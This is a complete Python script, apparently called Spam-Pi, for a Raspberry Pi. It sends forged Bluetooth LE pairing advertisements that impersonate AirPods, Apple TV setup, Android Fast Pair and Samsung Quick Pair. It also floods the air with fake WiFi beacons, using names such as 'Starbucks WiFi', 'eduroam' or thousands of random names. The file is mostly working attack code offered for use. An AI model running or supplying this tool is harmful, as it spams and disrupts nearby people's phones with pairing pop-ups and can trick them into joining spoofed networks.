#!/usr/bin/env python3
"""
Spam-Pi: Integrated BLE and WiFi Spamming Tool for Raspberry Pi
Copyright (c) 2024 Spam-Pi Contributors
Licensed under the MIT License
"""

import os
import sys
import time
import random
import subprocess
import threading
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

# --- BLE Payloads ---
APPLE_DEVICES = {
    "AirPods": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AirPods Pro": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AirPods Max": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0A, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "Beats Solo Pro": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0C, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "Apple TV Setup": [0x1E, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x01, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
}
ANDROID_FAST_PAIR = [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x45]
SAMSUNG_QUICK_PAIR = [0x18, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x61, 0x73, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
ALL_BLE_PAYLOADS = list(APPLE_DEVICES.values()) + [ANDROID_FAST_PAIR, SAMSUNG_QUICK_PAIR]

# --- WiFi Data ---
COMMON_SSIDS = ["Free Public WiFi", "Starbucks WiFi", "Xfinitywifi", "eduroam", "Guest WiFi", "FBI Surveillance Van #4", "Loading...", "Searching..."]
RANDOM_NAMES = ["Dave's iPhone", "Sarah's Laptop", "Office Printer", "Smart TV", "Home Hub"]

# --- Device Detection ---
def get_hci_devices():
    devices = []
    try:
        # Get IDs
        result = subprocess.run(['hciconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if line.startswith('hci'):
                devices.append({'id': line.split(':')[0], 'manufacturer': 'Unknown'})
        # Get Manufacturers
        detailed = subprocess.run(['hciconfig', '-a'], capture_output=True, text=True)
        current_dev = None
        for line in detailed.stdout.split('\n'):
            line = line.strip()
            if line.startswith('hci'): current_dev = line.split(':')[0]
            elif 'Manufacturer:' in line and current_dev:
                mfr = line.split('Manufacturer:')[1].strip()
                for dev in devices:
                    if dev['id'] == current_dev: dev['manufacturer'] = mfr
    except: pass
    return devices

def get_wifi_devices():
    interfaces = []
    try:
        with open('/proc/net/dev', 'r') as f:
            for line in f.readlines()[2:]:
                if ':' in line:
                    ifname = line.split(':')[0].strip()
                    if any(ifname.startswith(p) for p in ['wlan', 'wl', 'wlp']):
                        interfaces.append({'id': ifname, 'manufacturer': 'Unknown'})
        # Try airmon-ng for chips
        try:
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True)
            for i, dev in enumerate(interfaces):
                for line in result.stdout.split('\n'):
                    if dev['id'] in line:
                        parts = [p for p in line.split(' ') if p]
                        if len(parts) >= 3: interfaces[i]['manufacturer'] = " ".join(parts[2:])
        except: pass
    except: pass
    return interfaces

# --- BLE Spammer Class ---
class PiBLESpan:
    def __init__(self, hci_interface):
        self.hci_interface = hci_interface
        self.is_spamming = False
        self.thread = None

    def run_hcitool(self, ogf, ocf, params):
        params_hex = " ".join([f"{x:02x}" for x in params])
        cmd = f"hcitool -i {self.hci_interface} cmd 0x{ogf:02x} 0x{ocf:04x} {params_hex}"
        try:
            subprocess.run(cmd.split(), check=True, capture_output=True)
            return True
        except: return False

    def set_adv_enable(self, enable): return self.run_hcitool(0x08, 0x000A, [1 if enable else 0])
    def set_adv_params(self): return self.run_hcitool(0x08, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
    def set_adv_data(self, data):
        payload = [len(data)] + data + [0] * (31 - len(data))
        return self.run_hcitool(0x08, 0x0008, payload)

    def spam_task(self, payload, cycle=False):
        self.set_adv_enable(False)
        self.set_adv_params()
        if not cycle: self.set_adv_data(payload)
        
        while self.is_spamming:
            if cycle:
                for p in ALL_BLE_PAYLOADS:
                    if not self.is_spamming: break
                    self.set_adv_data(p)
                    self.set_adv_enable(True)
                    time.sleep(0.5)
                    self.set_adv_enable(False)
            else:
                self.set_adv_enable(True)
                time.sleep(1)

    def start(self, payload=None, cycle=False):
        self.is_spamming = True
        self.thread = threading.Thread(target=self.spam_task, args=(payload, cycle), daemon=True)
        self.thread.start()

    def stop(self):
        self.is_spamming = False
        if self.thread: self.thread.join()
        self.set_adv_enable(False)

# --- WiFi Spammer Class ---
class WiFiSpammer:
    def __init__(self, interface):
        self.interface = interface
        self.is_spamming = False
        self.threads = []

    def set_monitor(self, enable=True):
        try:
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
            subprocess.run(['iw', self.interface, 'set', 'monitor', 'none' if enable else 'managed'], check=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            return True
        except: return False

    def create_beacon(self, ssid):
        mac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        packet = RadioTap() / dot11 / beacon / essid
        return packet

    def spam_task(self, ssids):
        packets = [self.create_beacon(ssid) for ssid in ssids]
        while self.is_spamming:
            sendp(packets, iface=self.interface, verbose=False)

    def start(self, ssids):
        self.is_spamming = True
        if self.set_monitor(True):
            t = threading.Thread(target=self.spam_task, args=(ssids,), daemon=True)
            t.start()
            self.threads.append(t)
            return True
        return False

    def stop(self):
        self.is_spamming = False
        for t in self.threads: t.join()
        self.threads = []
        self.set_monitor(False)

# --- Main App ---
def main():
    if os.getuid() != 0:
        print("[!] Must be run as root (sudo).")
        sys.exit(1)

    print("--- Spam-Pi Integrated ---")
    
    # Selection
    bt_devs = get_hci_devices()
    wifi_devs = get_wifi_devices()
    
    hci_id = None
    wifi_id = None
    
    if bt_devs:
        print("\n[ Bluetooth Adapters ]")
        for i, d in enumerate(bt_devs): print(f"{i+1}. {d['id']} ({d['manufacturer']})")
        idx = input("Select BT (Enter to skip): ")
        if idx: hci_id = bt_devs[int(idx)-1]['id']
        
    if wifi_devs:
        print("\n[ WiFi Adapters ]")
        for i, d in enumerate(wifi_devs): print(f"{i+1}. {d['id']} ({d['manufacturer']})")
        idx = input("Select WiFi (Enter to skip): ")
        if idx: wifi_id = wifi_devs[int(idx)-1]['id']

    if not hci_id and not wifi_id:
        print("[!] No adapters selected. Exiting.")
        sys.exit(0)

    # Menu
    print("\n--- Spam Mode ---")
    print("1. BLE Only (Cycle All)")
    print("2. WiFi Only (Common SSIDs)")
    print("3. BOTH (BLE Cycle + WiFi Common)")
    print("4. Custom / Specific Selection")
    print("0. Exit")
    
    choice = input("\nChoice: ")
    
    ble_spammer = PiBLESpan(hci_id) if hci_id else None
    wifi_spammer = WiFiSpammer(wifi_id) if wifi_id else None
    
    try:
        if choice == '1' and ble_spammer:
            ble_spammer.start(cycle=True)
        elif choice == '2' and wifi_spammer:
            wifi_spammer.start(COMMON_SSIDS)
        elif choice == '3':
            if ble_spammer: ble_spammer.start(cycle=True)
            if wifi_spammer: wifi_spammer.start(COMMON_SSIDS)
        elif choice == '4':
            # Specific selection logic
            ble_payload = None
            ble_cycle = False
            wifi_ssids = None

            if ble_spammer:
                print("\n--- BLE Specific Selection ---")
                print("1. Cycle All (Default)")
                print("2. Apple Proximity")
                print("3. Android Fast Pair")
                print("4. Samsung Quick Pair")
                print("0. Skip BLE")
                bc = input("BLE Choice: ")
                if bc == '1': ble_cycle = True
                elif bc == '2':
                    apple_list = list(APPLE_DEVICES.keys())
                    for i, d in enumerate(apple_list): print(f"{i+1}. {d}")
                    ac = int(input("Select Apple Device: ")) - 1
                    ble_payload = APPLE_DEVICES[apple_list[ac]]
                elif bc == '3': ble_payload = ANDROID_FAST_PAIR
                elif bc == '4': ble_payload = SAMSUNG_QUICK_PAIR

            if wifi_spammer:
                print("\n--- WiFi Specific Selection ---")
                print("1. Common SSIDs (Default)")
                print("2. Thousands of Random APs")
                print("3. Custom SSID List")
                print("0. Skip WiFi")
                wc = input("WiFi Choice: ")
                if wc == '1': wifi_ssids = COMMON_SSIDS
                elif wc == '2':
                    count = int(input("How many APs? "))
                    wifi_ssids = [f"{random.choice(RANDOM_NAMES)}_{random.randint(100,999)}" for _ in range(count)]
                elif wc == '3':
                    custom = input("Enter SSIDs (comma separated): ")
                    wifi_ssids = [s.strip() for s in custom.split(',')]

            # Start selected
            if ble_spammer and (ble_payload or ble_cycle):
                ble_spammer.start(payload=ble_payload, cycle=ble_cycle)
            if wifi_spammer and wifi_ssids:
                wifi_spammer.start(wifi_ssids)

        elif choice == '0': sys.exit(0)
        
        print("\n[*] Spamming active! Press Ctrl+C to stop.")
        while True: time.sleep(1)
        
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
        if ble_spammer: ble_spammer.stop()
        if wifi_spammer: wifi_spammer.stop()
        print("[*] Done.")

if __name__ == "__main__":
    main()
